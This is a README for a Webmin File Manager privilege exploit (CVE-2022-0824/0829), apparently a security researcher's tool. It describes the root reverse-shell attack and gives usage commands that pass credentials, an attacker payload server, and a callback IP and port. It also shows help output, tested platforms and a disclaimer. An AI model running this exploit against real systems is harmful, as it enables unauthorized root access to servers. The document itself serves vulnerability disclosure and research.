# Webmin-CVE-2022-0824-revshell


## Vulnerability Description

Webmin 1.984 and below - File Manager privilege exploit (CVE-2022-0824 and CVE-2022-0829)  
Less privileged Webmin users who do not have any File Manager module restrictions configured can access files with root privileges, if using the default Authentic theme. All systems with additional untrusted Webmin users should upgrade immediately. Note that Virtualmin systems are not effected by this bug, due to the way domain owner Webmin users are configured.  
_Source: https://www.webmin.com/security.html_

## Exploit Description

This exploit takes advantage of the post-auth Improper Access Control vulnerability in File Manager. This exploit could be done by any less privileged authenticated attacker. It will download a .cgi file remotely from an attacker-controlled server and modify its permission to be a world-executables file. Once this is done, it will execute the .cgi file to establish a reverse connection to the attacker-controller server with root privileges.

_Reference: https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/_

## Usage

    $~ python3 Webmin-revshell.py -t [TARGET] -c [CREDENTIAL] -LS [PY3HTTP_SERVER] -L [CALLBACK_IP] -P [CALLBACK_PORT]
    $~ python3 Webmin-revshell.py -t https://192.168.5.118:10000 -c user:user123 -LS 192.168.5.120:9090 -L 192.168.5.120 -P 4444
    
    $~  python3 Webmin-revshell.py -h                                                                                                                                    
        usage: Webmin-revshell.py [-h] -t TARGET -c CREDENTIAL -LS PY3HTTP_SERVER -L CALLBACK_IP -P CALLBACK_PORT [-V]

        Webmin CVE-2022-0824 Reverse Shell

        optional arguments:
          -h, --help            show this help message and exit
          -t TARGET, --target TARGET
                                Target full URL, https://www.webmin.local:10000
          -c CREDENTIAL, --credential CREDENTIAL
                                Format, user:user123
          -LS PY3HTTP_SERVER, --py3http_server PY3HTTP_SERVER
                                Http server for serving payload, ex 192.168.5.120:8080
          -L CALLBACK_IP, --callback_ip CALLBACK_IP
                                Callback IP to receive revshell
          -P CALLBACK_PORT, --callback_port CALLBACK_PORT
                                Callback port to receive revshell
          -V, --version         show program's version number and exit

## PoC

    target host: https://192.168.5.118:10000
    attacker host: 192.168.5.120


https://user-images.githubusercontent.com/51811615/156904265-80c2ee4f-8447-41cd-9197-446bf6555e25.mp4


## Tested on
    
    - Webmin 1.984
    - Ubuntu 18.04
    - Kali 2021.3


## Disclaimer:

    The script is for security analysis and research only, hence I would not be liable if it is been used for illicit activities
